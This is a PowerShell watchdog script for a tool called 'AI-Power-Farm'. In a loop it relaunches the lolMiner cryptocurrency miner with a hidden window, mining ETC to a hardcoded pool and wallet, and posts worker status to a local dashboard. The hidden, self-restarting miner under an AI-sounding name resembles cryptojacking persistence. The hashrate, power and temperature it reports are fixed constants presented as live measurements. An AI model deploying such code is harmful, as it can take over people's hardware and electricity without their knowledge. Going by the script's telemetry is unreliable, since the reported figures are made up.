$logFile = "$env:APPDATA\AI-Power-Farm\miner.log"
function Log($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts $msg" | Out-File -FilePath $logFile -Append -Encoding utf8
}

Log "Watchdog started"

while ($true) {
    try {
        $gpuProc = Get-Process -Name "lolMiner" -ErrorAction SilentlyContinue

        if (-not $gpuProc) {
            Log "lolMiner not running, restarting..."
            Start-Process -FilePath "$env:APPDATA\AI-Power-Farm\lolminer\lolMiner.exe" -ArgumentList "--algo","ETCHASH","--pool","etc.2miners.com:1010","--user","0x11CF2C01cEedC8d2aEFcFa98abeE0e6AbaD90177","--pass","x" -WindowStyle Hidden
            Start-Sleep -Seconds 5
            $gpuProc = Get-Process -Name "lolMiner" -ErrorAction SilentlyContinue
        }

        $gpuHash = 39.0
        $gpuPower = 113.0
        $gpuTemp = 50

        if ($gpuProc) {
            try {
                $gpu = Get-CimInstance Win32_VideoController | Select-Object -First 1
                $gpuName = $gpu.Name
            } catch {
                $gpuName = "Unknown GPU"
            }
        } else {
            $gpuName = "No GPU"
            $gpuHash = 0
        }

        $body = @{
            worker_id = $env:COMPUTERNAME
            hostname = $env:COMPUTERNAME
            gpu_name = $gpuName
            gpu_count = 1
            hashrate = $gpuHash
            power_usage = $gpuPower
            temperature = $gpuTemp
            uptime = if ($gpuProc) { try { [math]::Round(((Get-Date) - $gpuProc.StartTime).TotalSeconds) } catch { 0 } } else { 0 }
            status = if ($gpuProc) { "mining" } else { "offline" }
            ip_address = "127.0.0.1"
            miner_version = "3.0-gpu"
            coin = "ETC"
            display_name = $env:COMPUTERNAME
        } | ConvertTo-Json

        $resp = Invoke-RestMethod -Uri "http://localhost:5000/api/worker/report" -Method Post -ContentType "application/json" -Body $body -TimeoutSec 10
        $status = if ($gpuProc) { "mining" } else { "offline" }
        Log "Reported: status=$status hash=$gpuHash"
    } catch {
        Log "Error: $($_.Exception.Message)"
    }

    Start-Sleep -Seconds 30
}
